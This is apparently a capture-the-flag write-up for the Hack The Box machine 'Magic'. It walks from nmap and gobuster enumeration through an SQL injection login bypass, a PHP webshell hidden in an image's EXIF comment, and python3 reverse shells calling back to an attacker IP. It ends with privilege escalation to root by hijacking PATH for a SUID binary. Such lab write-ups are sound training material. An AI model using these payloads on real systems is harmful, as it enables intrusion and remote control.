# Magic

First, set `magic.htb` to resolve to `10.10.10.185` in your `/etc/hosts` file.

## Enumeration

Let's start off with an all ports `nmap` scan.

```bash
$ nmap -sVC -p- -vvv -oN allports magic.htb
# Nmap 7.80 scan initiated Fri Apr 24 16:39:16 2020 as: nmap -sVC -p- -vvv -oN allports magic.htb
Nmap scan report for magic.htb (10.10.10.185)
Host is up, received syn-ack (0.052s latency).
Scanned at 2020-04-24 16:39:17 CDT for 36s
Not shown: 65533 closed ports
Reason: 65533 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 24 16:39:53 2020 -- 1 IP address (1 host up) scanned in 37.23 seconds
```

Going to the website first, we find a login page at `http://magic.htb/login.php`. We can bypass this with a SQL injection, putting `'or''='` in the username and password fields. And we're in!

After bypassing the login page, we are met with an image upload page. Upon trying to upload a PHP webshell, it tells us that only files with the extensions `JPG`, `JPEG` and `PNG` are allowed. Then, I try changing the file extension to `.jpeg` instead of `.php`, yet it is still rejected. This tells me that the server is checking the magic bytes of the file to detect its type.

We can embed a PHP shell in an image using `exiftool`, and then upload that.

```bash
$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
$ mv shell.jpg shell.php.jpg
```

Uploading this shell gives us a success message in the upper left corner: `The file shell.php.jpg has been uploaded.` Now we just have to figure out how to run it.

## Reverse Shell

We can do some quick webserver directory enumeration with `gobuster`:

```bash
$ gobuster dir -u http://magic.htb -w ~/tools/wordlists/directory-list-2.3-medium.txt --wildcard -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://magic.htb
[+] Threads:        40
[+] Wordlist:       /home/alichtman/tools/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/24 18:52:58 Starting gobuster
===============================================================
/assets (Status: 301)
/images (Status: 301)
```

That `images/` directory looks interesting.

```bash
$ gobuster dir -u http://magic.htb/images -w ~/tools/wordlists/directory-list-2.3-medium.txt --wildcard -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://magic.htb/images
[+] Threads:        40
[+] Wordlist:       /home/alichtman/tools/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/24 18:54:09 Starting gobuster
===============================================================
/uploads (Status: 301)
```

I would bet that my file gets uploaded here.

Navigating to `http://magic.htb/images/uploads/shell.php.jpg?cmd=ls` gives us command execution. Now for a reverse shell! Let's first see what tools are installed on the machine.

Sending a URL encoded request of `http://magic.htb/images/uploads/shell.php.jpg?cmd=which bash` (`http://magic.htb/images/uploads/shell.php.jpg?cmd=which+bash`) shows that `/bin/bash` is installed. Repeating this process a few times for other tools reveals that `python3` is also installed.

We launch a `nc` listener on port `1234`: `$ nc -lnvp 1234`, and then send the following web request to get a reverse shell with `python3`: `http://magic.htb/images/uploads/shell.php.jpg?cmd=python3+-c+%27import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((%2210.10.14.5%22,1234))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([%22/bin/sh%22,%22-i%22])%3b%27`

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.185] 34384
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/Magic/images/uploads$
```

We upgrade the shell to a full pseudo-terminal.

## User Privilege Escalation

Hunting around the directory tree for a bit, we find this file with some credentials in it:

```bash
$ www-data@ubuntu:/var/www/Magic$ head db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```

Great, we have a username and password. This should be an easy user privilege escalation.

```bash
$ www-data@ubuntu:/var/www/Magic$ su theseus
Password: # iamkingtheseus
su: Authentication failure
```

No dice. Let's dump the `mysql` database and see what's in it.

```bash
$ mysqldump -u theseus --password=iamkingtheseus --all-databases
...
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
...
```

That looks like a username and a password to me.

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password: # Th3s3usW4sK1ng
theseus@ubuntu:/var/www/Magic$
theseus@ubuntu:~$ wc user.txt
 1  1 33 user.txt
```

### Root Privilege Escalation

I move `LinEnum.sh` over and run it on the remote machine. I spot this line that looks out of place in the output:

```bash
[-] SUID files:
...
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
...
```

All of the other files in this output are `root root`, but this is `root users`, which means that any user can execute this, but it will execute with `root` privileges. Let's see what other processes this command spawns by watching the `pspy64` output while this runs.

```bash
2020/04/25 00:40:36 CMD: UID=0    PID=1      | /sbin/init auto noprompt
2020/04/25 00:40:44 CMD: UID=0    PID=6585   | lshw -short
2020/04/25 00:40:44 CMD: UID=0    PID=6584   | sh -c lshw -short
2020/04/25 00:40:44 CMD: UID=0    PID=6583   | /bin/sysinfo
2020/04/25 00:40:45 CMD: UID=0    PID=6586   |
2020/04/25 00:40:46 CMD: UID=0    PID=6591   | fdisk -l
2020/04/25 00:40:46 CMD: UID=0    PID=6590   | sh -c fdisk -l
```

So, it looks like `/bin/sysinfo` runs `lshw -short`. Since `lshw` isn't run by an absolute path, we can add in our own `lshw` script to the `$PATH` and have it execute as root. So, I create a file `lshw` in `/tmp` and put the following reverse shell code in it:

```bash
$ cat lshw
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

I then prepend `/tmp` to the `PATH` with `$ export PATH=/tmp:$PATH`. And run `$ sysinfo` after starting a `nc` listener on my Kali host.

```bash
$ nc -lvnp 1235
listening on [any] 1235 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.185] 42606
# whoami
root
```

And there's root.
